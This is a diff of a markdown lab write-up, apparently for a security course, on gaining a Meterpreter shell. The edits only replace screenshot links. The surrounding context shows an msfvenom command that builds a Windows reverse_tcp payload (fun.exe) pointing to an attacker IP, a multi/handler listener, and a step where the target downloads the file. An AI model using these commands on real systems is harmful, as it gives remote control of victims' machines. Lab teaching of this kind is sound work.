@@ -65,7 +65,8 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
-<img width="814" height="352" alt="image" src="https://github.com/user-attachments/assets/31b6de6e-7975-4eac-b76d-3bff82321410" />
+<img width="886" height="325" alt="1" src="https://github.com/user-attachments/assets/34a83447-d9a2-4acb-9fd5-e04b26fe9a57" />
+
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
@@ -93,7 +94,9 @@ Starting a command and control Server ```use multi/handler``` ```set PAYLOAD win
 
 ### Output 
 
-<img width="803" height="647" alt="image" src="https://github.com/user-attachments/assets/2546c2d0-15ae-4be1-abf7-2eed74aa33f0" />
+<img width="843" height="348" alt="3" src="https://github.com/user-attachments/assets/1c09071a-d60d-44b9-ae68-86e6d8f238eb" />
+
+<img width="880" height="325" alt="4" src="https://github.com/user-attachments/assets/20b47388-666c-4723-aa4c-643b6bc00666" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
